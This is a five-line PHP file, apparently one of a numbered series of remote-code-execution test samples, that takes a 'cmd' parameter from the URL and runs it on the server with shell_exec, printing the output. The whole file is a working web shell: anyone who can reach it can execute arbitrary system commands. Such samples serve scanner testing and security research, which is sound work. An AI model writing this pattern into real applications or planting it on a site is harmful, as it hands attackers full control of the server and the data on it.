<?php
// RCE test variation #121
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>